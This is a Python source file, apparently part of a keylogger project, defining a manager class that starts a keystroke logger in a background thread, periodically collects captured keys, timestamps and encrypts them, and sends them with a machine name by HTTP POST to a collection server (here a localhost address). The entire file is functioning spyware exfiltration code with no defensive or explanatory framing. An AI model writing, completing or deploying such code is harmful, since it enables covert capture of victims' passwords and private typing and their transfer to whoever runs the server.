import time
import threading
from datetime import datetime
import requests
import json


class KeyLoggerManager:
    def __init__(self, keylogger, writer, encryptor, interval=5, machine_name="Machine1"):
        self.keylogger = keylogger
        self.writer = writer
        self.encryptor = encryptor
        self.interval = interval
        self.machine_name = machine_name
        self.buffer = []
        self.running = False
        self.thread = None

    def send_data_to_server(self, data, machine_name):
        url = 'http://127.0.0.1:5000/receive_data'
        headers = {'Content-Type': 'application/json'}

        payload = {
            'data': data,
            'machine_name': machine_name
        }

        response = requests.post(url, headers=headers, data=json.dumps(payload))

        if response.status_code == 200:
            print("Data sent successfully!")
        else:
            print(f"Failed to send data: {response.status_code}")

    def collect_and_store(self):
        while self.running:
            keys = self.keylogger.get_logged_keys()
            if keys:
                keys = [key for key in keys if key is not None]
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                data = f"{timestamp} - {''.join(keys)}"
                encrypted_data = self.encryptor.encrypt(data)

                self.send_data_to_server(encrypted_data, self.machine_name)

                self.keylogger.logged_keys.clear()
            time.sleep(self.interval)

    def start(self):
        if not self.running:
            print("Starting keylogger manager...")
            self.running = True
            self.keylogger.start_logging()
            self.thread = threading.Thread(target=self.collect_and_store, daemon=True)
            self.thread.start()

    def stop(self):
        if self.running:
            self.running = False
            self.keylogger.stop_logging()
            if self.thread:
                self.thread.join()
